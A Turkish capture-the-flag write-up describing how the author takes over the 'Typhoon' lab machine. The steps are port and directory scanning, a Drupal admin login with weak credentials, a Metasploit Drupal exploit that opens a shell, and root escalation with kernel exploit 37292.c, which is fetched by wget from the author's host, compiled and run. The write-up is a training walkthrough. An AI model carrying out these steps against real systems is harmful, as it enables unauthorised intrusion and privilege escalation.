# PRİSMACSİ(DRUPAL) WRİTEUP
---------------------------------------------
PRISMACSI firmasının yayınladığı typhoon makinesindeki drupal ve linux kernel versiyonundan kaynaklanan zaafiyetlerden
yararlanarak ele geçirmemi anlatacağım.


## 1)İlk olaran nmap taraması yaparak açık olan portları ve üzerinde çalışan servisler hakkında bilgi topladım.

![image](/drupal/1.png)

## 2)Birçok port ve servisin çalıştığını öğrendikten sonra http üzerinden araştırmalarıma devam ettim.Hangi dizinlerin bulunduğunu bulmak için dirbuster taraması yaptım.

![image](/drupal/2.png)

## 3)Ve drupal burda gözüme çarpan ilk şey oldu.Direk bu adrese gittim.Admin girişi yapmak için şansımı denedim ve ilk denememde başarılı şekilde login oldum.(Username:Admin - Password:typhoon)

![image](/drupal/3.png)


![image](/drupal/4.png)

## 4)Daha drupal versiyonunu merak ettim ve wappalyzer eklentisiyle hangi teknolojilerinin kullanıldığının bilgilerini öğreniyorum.

![image](/drupal/5.png)

## 5)Burada drupal versiyonunu araştırmaya devam ediyorum.İlk olarak searchsploit üzerinden bulunan exploitleri listeliyorum.İşaretlemiş olduğum exploiti seçerek cve numarasını öğrenmek için exploit-db sayfasını ziyaret ettim.

![image](/drupal/6.png)


![image](/drupal/7.png)

## 6)CVE numarasını öğrendiğim exploiti metasploit üzerinden bulduktan sonra set ediyorum.

![image](/drupal/8.png)

## 7)Exploit için gerekli olan bilgileri girdikten sonra exploit işlemine başlıyorum .Meterpreter oturumu kurulduktan shell açıyorum.

![image](/drupal/9.png)

## 8)Sisteme giriş yaptıktan sonra bilgi toplamaya başladım.Burada linux kernel versiyonunu merak ediyorum.

![image](/drupal/10.png)

## 9)Bu versiyonu araştırmaya başlıyorum ve ilk olarak yine searchsploit üzerinden aramamı yapıyorum.Bulunan exploitler içinden uygun olanı seçiyorum.

![image](/drupal/11.png)


![image](/drupal/12.png)

## 10)İlk olarak bulduğum exploiti kendi makineme indiriyorum.Daha sonra kendi makinemden zafiyetli makineye wget(wget ip_adresim[:]8081[/]37292.c) aracılığla indiriyorum.İndirmiş olduğum exploiti gcc(gcc 37292.c -o exp) ile derledim sonra exploite execute(chmod + exp) yetkisi vererek çalıştırdım.Anında root olarak root dizinine gidiyorum ve root için bırakılmış flağı okuyorum.

![image](/drupal/13.png)


![image](/drupal/14.png)


